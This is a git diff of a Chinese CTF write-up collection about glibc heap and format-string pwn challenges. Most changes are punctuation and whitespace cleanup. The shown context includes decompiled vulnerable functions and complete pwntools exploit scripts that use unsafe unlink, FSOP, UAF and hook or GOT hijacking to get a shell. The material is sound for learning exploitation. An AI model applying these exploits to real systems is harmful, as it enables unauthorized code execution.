@@ -7,11 +7,10 @@ tags: [exercise]
 ---
 
 ## 前言
-> 由于笔者想记录一下做过的题,但又不想每次都单独写一篇文章,故汇为一篇.
-> 目前文章状态:  **长期更新中**
+> 由于笔者想记录一下做过的题，但又不想每次都单独写一篇文章，故汇为一篇。
+> 目前文章状态： **长期更新中**
 
 ## glibc
-
 
 ### 杂
 
@@ -19,7 +18,7 @@ tags: [exercise]
 
 > 来源：NSSCTF
 
-主要逻辑在`game()`函数中
+主要逻辑在 `game()` 函数中
 ```C
 void __noreturn game()
 {
@@ -127,9 +126,9 @@ void *__fastcall to_sale(void *a1)
   return result;
 }
 ```
-创建的子进程会 usleep(50000) ,也就是 sleep(5) .
-子进程运行时,父进程包含停止.
-说明可以同时开几个子进程,在 **bags[a1]** 未置零时继续卖物品.
+创建的子进程会 usleep(50000) ，也就是 sleep(5) .
+子进程运行时，父进程包含停止。
+说明可以同时开几个子进程，在 **bags[a1]** 未置零时继续卖物品。
 一物多卖就是漏洞
 
 ##### exp
@@ -280,14 +279,12 @@ info('system:'+hex(system))
 binsh = libc.search(b'/bin/sh').__next__()
 info('binsh:'+hex(binsh))
 
-
 payload = b'%'+str(0x10).encode() + b'c%16$hhn'
 payload += b'%'+str(0x30).encode() + b'c%17$hhn'
 payload += b'%'+str(0x90).encode() + b'c%18$hhn'
 payload += b'%43$p'
 payload = payload.ljust(0x40, b'x')
 payload += p64(fini+1)+p64(fini+2)+p64(fini)
-
 
 io.recvuntil(b'Just pwn it!\n')
 io.sendline(payload)
@@ -296,18 +293,15 @@ io.recvuntil(b'0x')
 stack = int(io.recv(12).strip(), 16) - 0x1c8
 info('stack:'+hex(stack))
 
-
 payload = b'/bin/sh\0' * 2 + p64(rdi)
 io.recvuntil(b'Please enter your name len:\n')
 io.sendline(str(32).encode())
 io.recvuntil(b'Please enter your name:\n')
 io.sendline(payload)
 
-
 _rdi1 = rdi & 0xff
 _rdi2 = (rdi >> 8) & 0xff
 _rdi3 = (rdi >> 16) & 0xff
-
 
 rdi1 = _rdi1
 rdi2 = (_rdi2 + 0x100 - _rdi1) & 0xff
@@ -323,7 +317,6 @@ _system4 = (system >> 24) & 0xff
 _system5 = (system >> 32) & 0xff
 _system6 = (system >> 40) & 0xff
 
-
 system1 = (_system1 + 0x100 - _rdi3) & 0xff
 system2 = (_system2 + 0x100 - _system1) & 0xff
 system3 = (_system3 + 0x100 - _system2) & 0xff
@@ -336,7 +329,6 @@ info('system3:'+hex(system3))
 info('system4:'+hex(system4))
 info('system5:'+hex(system5))
 info('system6:'+hex(system6))
-
 
 payload = b'c%31$ln%39$ln'
 payload += b'%'+str(rdi1-1).encode() + b'c%28$hhn'
@@ -364,8 +356,6 @@ io.sendline(payload)
 
 io.interactive()
 ```
-
-
 
 #### ez_fmt_revenge
 
@@ -405,7 +395,6 @@ int vuln()
 
 在第二次利用格式化字符串时构造 ROP。
 
-
 ##### exp
 ```python
 from pwn import *
@@ -436,7 +425,6 @@ payload += b'%43$p%3$p'
 payload = payload.ljust(0x40, b'x')
 payload += p64(fini+1)+p64(fini+2)+p64(fini)
 
-
 io.recvuntil(b'Just pwn it!\n')
 io.sendline(payload)
 
@@ -461,11 +449,9 @@ payload = b'/bin/sh\0'
 io.recvuntil(b'Please enter your name:\n')
 io.send(payload)
 
-
 _rdi1 = rdi & 0xff
 _rdi2 = (rdi >> 8) & 0xff
 _rdi3 = (rdi >> 16) & 0xff
-
 
 rdi1 = _rdi1
 rdi2 = (_rdi2 + 0x100 - _rdi1) & 0xff
@@ -481,7 +467,6 @@ _system4 = (system >> 24) & 0xff
 _system5 = (system >> 32) & 0xff
 _system6 = (system >> 40) & 0xff
 
-
 system1 = (_system1 + 0x100 - _rdi3) & 0xff
 system2 = (_system2 + 0x100 - _system1) & 0xff
 system3 = (_system3 + 0x100 - _system2) & 0xff
@@ -494,7 +479,6 @@ info('system3:'+hex(system3))
 info('system4:'+hex(system4))
 info('system5:'+hex(system5))
 info('system6:'+hex(system6))
-
 
 payload = b'c%36$ln%42$ln'
 payload += b'%'+str(rdi1-1).encode() + b'c%33$hhn'
@@ -523,16 +507,11 @@ payload += p64(stack+0x9)+p64(stack+0xa)+p64(stack+0x8)
 payload += p64(stack+0x10)
 payload += p64(0x404060)+p64(0x404060+1)+p64(0x404060+2)
 
-
-
 io.recvuntil(b'Just pwn it!\n')
 io.sendline(payload)
 
 io.interactive()
 ```
-
-
-
 
 > 来源：sally
 
@@ -542,7 +521,7 @@ io.interactive()
 
 > 来源：BUUOJ
 
-修了一下符号表,主函数内容大致如下
+修了一下符号表，主函数内容大致如下
 ```C
 __int64 __fastcall main(char *a1, char **a2, char **a3)
 {
@@ -609,10 +588,9 @@ unsigned __int64 __fastcall edit(book *arr)
   return t;
 }
 ```
-在 edit() 函数中,发现 **size** 是用户端输入,可以与 add() 函数中的不同,此处有溢出漏洞.
+在 edit() 函数中，发现 **size** 是用户端输入，可以与 add() 函数中的不同，此处有溢出漏洞。
 
-利用思路: 构造堆重叠 -> 泄露 libc -> 劫持 `hook` 为 one_gadget.
-
+利用思路：构造堆重叠 -> 泄露 libc -> 劫持 `hook` 为 one_gadget.
 
 ##### exp
 ```python
@@ -635,7 +613,6 @@ def add(size: int):
     io.recvuntil(b'Size:')
     io.sendline(str(size).encode())
 
-
 def edit(idx: int, size: int, content: bytes):
     cmd(2)
     io.recvuntil(b'Index:')
@@ -645,12 +622,10 @@ def edit(idx: int, size: int, content: bytes):
     io.recvuntil(b'Content:')
     io.send(content)
 
-
 def delete(idx: int):
     cmd(3)
     io.recvuntil(b'Index:')
     io.sendline(str(idx).encode())
-
 
 def show(idx: int):
     cmd(4)
@@ -676,7 +651,6 @@ delete(1)
 # 指针就会写到chunk2的fd和bk上
 add(0x20) # 1
 
-
 # 泄露libc
 show(2)
 libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3c4b78
@@ -698,14 +672,11 @@ extend += p64(0)+p64(0x71)
 extend += p64(malloc_hook-0x23)
 edit(2, len(extend), extend)
 
-
 add(0x60) # 3
 add(0x60) # 7 to mallo_hook
 
-
 con = b'a'*0x13+p64(one_gadget)
 edit(7, len(con), con)
-
 
 # 触发malloc_hook
 add(255)
@@ -817,11 +788,9 @@ unsigned __int64 edit_heap()
 }
 ```
 
+edit_heap() 函数会请求输入**size**，故存在溢出。
 
-edit_heap() 函数会请求输入**size**,故存在溢出.
-
-思路: 通过 *unsafe unlink* ,修改 heap 地址数组,劫持 atoi() 为 system()
-
+思路：通过 *unsafe unlink* ，修改 heap 地址数组，劫持 atoi() 为 system()
 
 ##### exp
 ```python
@@ -830,7 +799,6 @@ from pwn import *
 context.log_level = 'debug'
 context.arch = 'amd64'
 context.terminal = ['tmux', 'splitw', '-h']
-
 
 elf = ELF('./easyheap')
 libc = ELF('./libc-2.23.so')
@@ -842,14 +810,12 @@ def cmd(c: int):
     io.recvuntil(b'Your choice :')
     io.sendline(str(c).encode())
 
-
 def add(size: int, content: str):
     cmd(1)
     io.recvuntil(b'Size of Heap : ')
     io.sendline(str(size).encode())
     io.recvuntil(b'Content of heap:')
     io.send(content)
-
 
 def edit(idx: int, size: int, content: str):
     cmd(2)
@@ -860,12 +826,10 @@ def edit(idx: int, size: int, content: str):
     io.recvuntil(b'Content of heap : ')
     io.send(content)
 
-
 def delete(idx: int):
     cmd(3)
     io.recvuntil(b'Index :')
     io.sendline(str(idx).encode())
-
 
 arr = 0x6020E0
 
@@ -882,19 +846,16 @@ extend += p64(0x30)+p64(0x90)
 edit(1, len(extend), extend)
 delete(2)
 
-
 # 修改指针
 edit(1, 0x20, p64(0)*2+p64(elf.got['atoi']))
 
 # 修改atoi为system
 edit(0, 0x8, p64(elf.plt['system']))
 
-
 io.sendline(b'/bin/sh')
 
 io.interactive()
 ```
-
 
 #### little game
 
@@ -988,7 +949,6 @@ unsigned __int64 __fastcall bug(void *a1, int a2)
 故本题无法使用 fast bin .
 进而想到使用 *unsorted bins attack* 进行 *FSOP*.
 
-
 ##### exp
 ```python
 from pwn import *
@@ -997,35 +957,29 @@ context.log_level = 'debug'
 context.terminal = ['tmux', 'splitw', '-h']
 context.arch = 'amd64'
 
-
 libc = ELF('./libc-2.23.so')
 
 io = process('./little_game')
 gdb.attach(io, '''b *$rebase(0x12F9)''')
 
-
 def cmd(c):
     io.recvuntil(b'What\'s your choice?')
     io.sendline(str(c).encode())
-
 
 def add(size: int):
     cmd(1)
     io.recvuntil(b'Size:')
     io.sendline(str(size).encode())
 
-
 def delete(idx: int):
     cmd(2)
     io.recvuntil(b'Index:')
     io.sendline(str(idx).encode())
 
-
 def show(idx: int):
     cmd(3)
     io.recvuntil(b'Index:')
     io.sendline(str(idx).encode())
-
 
 def edit(idx: int, content):
     cmd(4)
@@ -1033,8 +987,6 @@ def edit(idx: int, content):
     io.sendline(str(idx).encode())
     io.recvuntil(b'Content:')
     io.send(content)
-
-
 
 add(0x88)  # 0
 '''
@@ -1098,14 +1050,12 @@ delete(2)
 top chunk合并
 '''
 
-
 add(0x490) # 1
 edit(1, b'a'*0x20+p64(0)+p64(0x301))
 delete(3)
 '''
 准备unsorted bin attack
 '''
-
 
 vtable = p64(system)*4
 vtable_addr = heap_addr + 0xa0
@@ -1244,14 +1194,12 @@ libc = ELF('./libc-2.23.so')
 io = process('./b00ks')
 gdb.attach(io, 'b *$rebase(0x1240)')
 
-
 # addr = 'node5.buuoj.cn:26678'.split(':')
 # io = remote(addr[0], addr[1])
 
 def cmd(c: int):
     io.recvuntil(b'> ')
     io.sendline(str(c).encode())
-
 
 def add(nsize: int, name: bytes, csize: int, content: bytes):
     cmd(1)
@@ -1264,12 +1212,10 @@ def add(nsize: int, name: bytes, csize: int, content: bytes):
     io.recvuntil(b'Enter book description: ')
     io.sendline(content)
 
-
 def delete(idx: int):
     cmd(2)
     io.recvuntil(b'Enter the book id you want to delete: ')
     io.sendline(str(idx).encode())
-
 
 def edit(idx: int, content: bytes):
     cmd(3)
@@ -1278,16 +1224,13 @@ def edit(idx: int, content: bytes):
     io.recvuntil(b'Enter new book description: ')
     io.sendline(content)
 
-
 def show():
     cmd(4)
-
 
 def rename():
     cmd(5)
     io.recvuntil(b'Enter author name: ')
     io.sendline(b'a' * 0x1f + b'x')
-
 
 io.recvuntil(b'Enter author name: ')
 io.sendline(b'a' * 0x1f + b'x')
@@ -1303,7 +1246,6 @@ add(0x20, b'a' * 0x10, 0x20, b'a' * 0x10)  # 2
 防止合并
 '''
 
-
 '''
 泄露 heap 地址
 '''
@@ -1312,17 +1254,13 @@ io.recvuntil(b'aaax')
 heap = u64(io.recv(6) + b'\x00\x00') - 0x30
 info('heap: ' + hex(heap))
 
-
-
 content = p64(1) + p64(heap) + p64(heap+0x1a0) + p64(0xffff)
 edit(1, content)
-
 
 rename()
 '''
 修改 arr 中的 chunk 指针
 '''
-
 
 '''
 泄露 libc 地址
@@ -1346,7 +1284,6 @@ info('one_gadget: ' + hex(one_gadget))
 content = p64(3) + p64(free_hook) + p64(free_hook) + p64(0x20)
 edit(1, content)
 edit(3, p64(one_gadget))
-
 
 '''
 触发 one_gadget
@@ -1446,7 +1383,7 @@ unsigned __int64 change_item()
   return __readfsqword(0x28u) ^ v5;
 }
 ```
-**change_item()** 函数中有对 size 的输入，而未做相应的检测。 
+**change_item()** 函数中有对 size 的输入，而未做相应的检测。
 即，存在堆溢出漏洞。
 这里思路是通过 unsafe unlink 修改存放 chunk 地址的数组内容。
 
@@ -1466,15 +1403,12 @@ arr = 0x6020C8
 io = process('./bamboobox')
 gdb.attach(io, 'b *0x400E42')
 
-
 def cmd(choice: int):
     io.recvuntil(b'Your choice:')
     io.sendline(str(choice).encode())
 
-
 def show():
     cmd(1)
-
 
 def add(size: int, content: bytes):
     cmd(2)
@@ -1482,7 +1416,6 @@ def add(size: int, content: bytes):
     io.sendline(str(size).encode())
     io.recvuntil(b'Please enter the name of item:')
     io.send(content)
-
 
 def edit(index: int, size: int, content: bytes):
     cmd(3)
@@ -1493,12 +1426,10 @@ def edit(index: int, size: int, content: bytes):
     io.recvuntil(b'Please enter the new name of the item:')
     io.send(content)
 
-
 def delete(index: int):
     cmd(4)
     io.recvuntil(b'Please enter the index of item:')
     io.sendline(str(index).encode())
-
 
 add(0x40, b'a'*0x1)  # 0
 add(0x80, b'b'*0x1)  # 1
@@ -1520,12 +1451,10 @@ extend += p64(0x40)+p64(0x90)
 '''
 edit(0, len(extend), extend)
 
-
 delete(1)
 '''
 触发 unlink
 '''
-
 
 show()
 libc.address = u64(io.recvuntil(b'\x7f')[-6:]+b'\x00\x00') - 0x3c48e0
@@ -1543,7 +1472,6 @@ edit(0, 8, p64(system))
 '''
 劫持 atoi 的 GOT 表
 '''
-
 
 io.interactive()
 ```
@@ -1623,9 +1551,9 @@ unsigned __int64 del()
   return __readfsqword(0x28u) ^ v3;
 }
 ```
-对指针进行 free 操作,
-但是为对指针进行置空.
-即, *UAF*
+对指针进行 free 操作，
+但是为对指针进行置空。
+即，*UAF*
 
 而程序未开启 PIE, 还有 '/bin/sh' 字样
 直接通过劫持 print 为 system
@@ -1663,7 +1591,6 @@ def show(idx:int):
     cmd(3)
     io.sendlineafter(b'index: ', str(idx).encode())
 
-
 add(0x20, b'a'*0x20)
 add(0x20, b'b'*0x20)
 add(0x40, b'c'*0x40)
@@ -1672,7 +1599,6 @@ add(0x40, b'c'*0x40)
 delele(0)
 delele(1)
 #放入 tcache bin 中
-
 
 add(0x10, p64(binsh)+p64(system))
 '''
@@ -1687,7 +1613,6 @@ show(0)
 
 io.interactive()
 ```
-
 
 ### heap 2.31
 
@@ -1759,11 +1684,10 @@ void __cdecl __noreturn vuln()
 }
 ```
 
+index 若为负数，则存在数组越位。
+bss 段上 feedbacl_list 在 `stdout`,`stdin`,`stderr` 之后。
 
-index 若为负数,则存在数组越位.  
-bss 段上 feedbacl_list 在`stdout`,`stdin`,`stderr`之后.
-
-可通过数组越位修改这些结构体的值.
+可通过数组越位修改这些结构体的值。
 
 ##### exp
 ```python
@@ -1778,13 +1702,11 @@ libc = ELF('./libc-2.31.so')
 io = process('./feedback')
 gdb.attach(io, 'b *$rebase(0x1581)')  
 
-
 def edit(idx, content):
     io.recvuntil(b'Which list do you want to write?')
     io.sendline(str(idx).encode())
     io.recvuntil(b'Then you can input your feedback.')
     io.sendline(content)
-
 
 '''
 0xfbad1800是覆写_flag.
@@ -1794,8 +1716,6 @@ b'\x00'是覆写_IO_write_base的最后一字节,
 '''
 payload = p64(0xfbad1800) + p64(0) * 3 + b'\x00'
 edit(-8, payload)
-
-
 
 libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ec980
 info('libc.address: ' + hex(libc.address))
@@ -1810,7 +1730,6 @@ base_addr就是flag的地址
 info('base_addr: ' + hex(base_addr))
 info('end_addr: ' + hex(end_addr))
 
-
 '''
 payload的写法和之前类似
 _IO_write_base与_IO_write_ptr的 区间包含了flag
@@ -1818,11 +1737,9 @@ _IO_write_base与_IO_write_ptr的 区间包含了flag
 payload = p64(0xfbad1800) + p64(0) * 3 + p64(base_addr)+p64(end_addr)+p64(0)*3
 edit(-8, payload)
 
-
 io.interactive()
 
 ```
-
 
 #### tcache_king
 
@@ -1905,26 +1822,21 @@ elf = ELF('./pwn')
 io = process(elf.path)
 # gdb.attach(io, 'b * 0x4016E4')
 
-
 def cmd(num):
     io.sendlineafter(b'>> ', str(num).encode())
-
 
 def add():
     cmd(1)
     io.sendlineafter(b'Size: ', b'32')
-
 
 def edit(idx, content):
     cmd(2)
     io.sendlineafter(b'Idx:', str(idx).encode())
     io.sendafter(b'Content: ', content)
 
-
 def free(idx):
     cmd(3)
     io.sendlineafter(b'Idx:', str(idx).encode())
-
 
 arr = 0x4035a0
 
